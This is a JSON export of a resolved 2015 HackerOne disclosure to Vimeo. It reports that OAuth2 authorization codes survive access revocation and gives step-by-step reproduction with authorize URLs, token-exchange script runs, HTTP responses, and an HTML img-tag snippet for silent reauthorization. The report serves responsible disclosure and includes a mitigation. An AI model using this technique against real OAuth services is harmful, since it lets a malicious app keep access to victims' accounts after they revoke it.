{
  "id": 57603,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NzYwMw==",
  "url": "https://hackerone.com/reports/57603",
  "title": "API: missing invalidation of OAuth2 Authorization Code during access revocation causes authorization bypass",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-04-21T14:44:49.464Z",
  "submitted_at": "2015-04-21T14:44:49.464Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dor1s",
    "url": "/dor1s",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/930/63baa5788d9952bc13497da61518a8902db31756_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 56,
    "url": "https://hackerone.com/vimeo",
    "handle": "vimeo",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Vimeo",
      "twitter_handle": "vimeo",
      "website": "https://vimeo.com",
      "about": "Make life worth watching"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2015-05-31T17:40:09.964Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2015-05-01T17:39:39.799Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all `access_token`s are being revoked and become invalid. But not only `access_token`s should be revoked, authorization `code`s (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization `code` during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.\r\n\r\nProof of Concept\r\n==============\r\n*(all scripts used are attached)*\r\n\r\n1) Open the link for OAuth2 authorization for some application. Example link for my test application (**Dor1s Test1**, feel free to use my test application to reproduce the issue):\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\r\n```\r\n2) Log into your Vimeo account (if needed) and click **Allow**\r\n3) Copy `code` value from callback url, for example:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef&code=e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n```\r\n`code` value is `e1fa87cd449ae55b74445b31ac79450c14eeb657`\r\n4) Use `code` value to obtain `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n{\r\n    \"access_token\": \"d3ac3bb53d1c4ebc3de7d28e4ed801c0\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n<... CUT OUT ... >\r\n}\r\n```\r\n5) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:10:29 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:10:29 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1239-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429625429.334602,VS0,VE203\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n< ... CUT OUT ... >\r\n}\r\n```\r\n6) Repeat step 1. Link for my test application:\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\r\n```\r\n7) Repeat step 2. Log into your accounts (if needed) and click **Allow**.\r\n*Note:* it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.\r\n\r\n*Note 2:* often OAuth providers allow to use `approval_prompt=auto` parameter, which makes this step does not require user to click **Allow** again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:\r\n```\r\n<html>\r\n\t<img src=\"https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\">\r\n</html>\r\n```\r\n\r\nsuch code will \"silently\" produce new `access_token` value to callback each time it has been loaded by the user.\r\n\r\n8) Copy `code` value from callback url and save it for future usage:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef&code=82e24f835184f47cd83f249907e7bd5018bf62c9\r\n```\r\n`code` value is `82e24f835184f47cd83f249907e7bd5018bf62c9`\r\n\r\n9) Go to account security settings [https://vimeo.com/settings/apps](https://vimeo.com/settings/apps)\r\n\r\n10) **Disconnect** the application (**Dor1s Test1** if my test application used) from **Apps** section\r\n\r\n11) To ensure that access is denied, repeat step 5:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 401 Authorization Required\r\nDate: Tue, 21 Apr 2015 14:23:55 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.error+json\r\nCache-Control: no-cache, max-age=315360000\r\nWWW-Authenticate: Bearer error=\"invalid_token\"\r\nExpires: Fri, 18 Apr 2025 14:23:55 GMT\r\nContent-Length: 53\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nX-Served-By: cache-fra1245-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626235.146346,VS0,VE105\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"error\": \"A valid user token must be passed.\"\r\n}\r\n```\r\n12) Use `code` value from step 8 and exchange it for `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9\r\n{\r\n    \"access_token\": \"9eabdc746910ea39c07395ee1b69a2b9\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n<... CUT OUT ...>\r\n}\r\n```\r\n13) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:25:41 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:25:41 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1235-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626341.087757,VS0,VE201\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n<... CUT OUT ...>\r\n}\r\n```\r\n\r\nImpact\r\n======\r\nThe vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.\r\n\r\nMitigation\r\n========\r\nFor access revocation processing all authorization `code` issued for certain pair of user and application should be invalidated (as it currently being done for `access_token` values).",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 35603,
      "file_name": "getAccessToken.sh.txt",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/035/603/d757f905c14ffd7a97358c6d9d744e4050c3e1cd/getAccessToken.sh.txt?response-content-disposition=attachment%3B%20filename%3D%22getAccessToken.sh.txt%22%3B%20filename%2A%3DUTF-8%27%27getAccessToken.sh.txt&response-content-type=text%2Fx-shellscript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXRXU3OTY%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T202843Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDOGQF2QmOfGx8RsXFJpAYxnMLC6hAQkjCsIFHnPEoq5AiEAzfaTulSaD7oLY%2BGvmI4vNdVDWZfq51CHkGy79mstjFgqsgUINBADGgwwMTM2MTkyNzQ4NDkiDDLEV9HzKt9epxp8KyqPBTIXHujA08PyqgFNjyvcAD%2Fehixihk4qWRLe9THz9ONSr%2Fa9jVSqjsB0VqK%2FHDrTEQW5lLLQaBHVojT1KcPX4mzrmhDiI3bWj89QL5NAcCXpRmLxRkwqJvcpnlZkcFW3cU%2F7V2Wtd84%2FYslO%2Feg1XLfNaxQexrA4n%2BA8MCtmOu%2BRZ%2FrzjUqC3yWNimdmY8rnJxuVESpD4tkNUsKR9wVS0IRKTgtWK%2FeM08mRrKxtJE7CLFeepp%2FFZCGoFCbTxDfWpQhHZHequZzqQmyyomE%2F11UASaXgJ4aWec9Dk9G%2FAwe63ViKsTQqkpwwzBG99pb5Ut0X3cd4ZwSkRgeyQt4FggoFGLuGGM%2FoLvhuPpTq981osZ0wQmptxHD0LdvWye%2F%2F05RhARySwsXt3R3vwod4MYmF4CDiZj4hZRk67cYvmo4uz2ulghw2g9OIEd34znGzpEH9M93ia39LYy%2F1nhn5eF3%2BKKokXe4unRDmde5QDTOkmIqFuW6Vn76XWnaFL0lNtx7bBKSn8bBBoQD7u%2Bpwcc%2BlpFnWzQ77prJl7KZwW%2BNYyy8Lcfyn%2BK5ls7%2BgPWwggqukUecTsGDgDwMlgi0rUbWiGkArR7ZqWS0kzhGjm9luKXHdkn6l%2FQxR%2BLgzhZ8QBgXfTaFhWwrGXfHwOKkKajv9vTcIyiOpvDwrh4PbqbVkj4he3sA5mxouL0HODdMZ86JyrG41JFC13umklylDv5JgbY0OQuBCM1BF7fTC9JvDXGwj5fag1l66OXKfW2F%2B3Hsy4hRXQIu3GAuiY9E6UT%2BeGWj19ajNJpFKsD9th6Ve0s1WE8I%2FGEZiQNy1L%2BNxmmOCZm1ChMmJbN5gutuaxKmjItmmEHwMCDnOIZbl1NwwncDGxgY6sQFfiT0BHzTCGfNqPPve3pHtV6dy5ZAZczr2iIkf%2BTlTBl5t8eQIrVoww3exVm%2BZz9%2BXCre2Yz5vKxe8oOGboViJFVOqvLL3LFLyn6xNAo%2BUG3EsrGwy6lKRaSLD5%2BnfVXv7sO5cPbvwPHg8ryLWDBJzMeRZSFlH640ZkSBpZH2MknPvX9R71YrnRlIoKOsVr41wT3%2Ba9a5v9BrH0Q6klqJF47tsvSrggmVhpdmYDKt5%2BWI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a76a7432ae8894b5c88551f4292d10856d7c7a1bd9a7dea6d2c87e6a745c052",
      "file_size": 335,
      "type": "text/x-shellscript",
      "moderated": null
    },
    {
      "id": 35604,
      "file_name": "me.sh.txt",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/035/604/0c0c5d2ac149868c9732fca6431dfaf7d37bc29f/me.sh.txt?response-content-disposition=attachment%3B%20filename%3D%22me.sh.txt%22%3B%20filename%2A%3DUTF-8%27%27me.sh.txt&response-content-type=text%2Fx-shellscript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXRXU3OTY%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T202843Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDOGQF2QmOfGx8RsXFJpAYxnMLC6hAQkjCsIFHnPEoq5AiEAzfaTulSaD7oLY%2BGvmI4vNdVDWZfq51CHkGy79mstjFgqsgUINBADGgwwMTM2MTkyNzQ4NDkiDDLEV9HzKt9epxp8KyqPBTIXHujA08PyqgFNjyvcAD%2Fehixihk4qWRLe9THz9ONSr%2Fa9jVSqjsB0VqK%2FHDrTEQW5lLLQaBHVojT1KcPX4mzrmhDiI3bWj89QL5NAcCXpRmLxRkwqJvcpnlZkcFW3cU%2F7V2Wtd84%2FYslO%2Feg1XLfNaxQexrA4n%2BA8MCtmOu%2BRZ%2FrzjUqC3yWNimdmY8rnJxuVESpD4tkNUsKR9wVS0IRKTgtWK%2FeM08mRrKxtJE7CLFeepp%2FFZCGoFCbTxDfWpQhHZHequZzqQmyyomE%2F11UASaXgJ4aWec9Dk9G%2FAwe63ViKsTQqkpwwzBG99pb5Ut0X3cd4ZwSkRgeyQt4FggoFGLuGGM%2FoLvhuPpTq981osZ0wQmptxHD0LdvWye%2F%2F05RhARySwsXt3R3vwod4MYmF4CDiZj4hZRk67cYvmo4uz2ulghw2g9OIEd34znGzpEH9M93ia39LYy%2F1nhn5eF3%2BKKokXe4unRDmde5QDTOkmIqFuW6Vn76XWnaFL0lNtx7bBKSn8bBBoQD7u%2Bpwcc%2BlpFnWzQ77prJl7KZwW%2BNYyy8Lcfyn%2BK5ls7%2BgPWwggqukUecTsGDgDwMlgi0rUbWiGkArR7ZqWS0kzhGjm9luKXHdkn6l%2FQxR%2BLgzhZ8QBgXfTaFhWwrGXfHwOKkKajv9vTcIyiOpvDwrh4PbqbVkj4he3sA5mxouL0HODdMZ86JyrG41JFC13umklylDv5JgbY0OQuBCM1BF7fTC9JvDXGwj5fag1l66OXKfW2F%2B3Hsy4hRXQIu3GAuiY9E6UT%2BeGWj19ajNJpFKsD9th6Ve0s1WE8I%2FGEZiQNy1L%2BNxmmOCZm1ChMmJbN5gutuaxKmjItmmEHwMCDnOIZbl1NwwncDGxgY6sQFfiT0BHzTCGfNqPPve3pHtV6dy5ZAZczr2iIkf%2BTlTBl5t8eQIrVoww3exVm%2BZz9%2BXCre2Yz5vKxe8oOGboViJFVOqvLL3LFLyn6xNAo%2BUG3EsrGwy6lKRaSLD5%2BnfVXv7sO5cPbvwPHg8ryLWDBJzMeRZSFlH640ZkSBpZH2MknPvX9R71YrnRlIoKOsVr41wT3%2Ba9a5v9BrH0Q6klqJF47tsvSrggmVhpdmYDKt5%2BWI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=599b928767491960e721e997d8c912773651a8d86c04bea21c7c0beaa5d03e61",
      "file_size": 70,
      "type": "text/x-shellscript",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2015-05-31T17:40:03.386Z",
  "allow_singular_disclosure_after": -325478919.76506037,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "mr-medi",
    "r3y",
    "pr0f0x01",
    "shivammusic",
    "b2e03cf86efe1b26323c39c",
    "runkixt",
    "webtrack",
    "destinedtohack"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
